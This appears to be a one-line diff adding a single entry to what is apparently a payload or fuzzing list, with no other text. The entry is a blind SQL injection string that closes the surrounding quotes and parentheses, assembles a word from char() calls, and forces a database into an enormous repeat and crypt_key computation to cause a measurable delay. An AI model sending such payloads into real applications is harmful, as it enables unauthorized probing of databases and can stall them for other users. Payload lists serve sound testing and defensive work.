@@ -1,0 +1,1 @@
+1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('acly' like 'acly
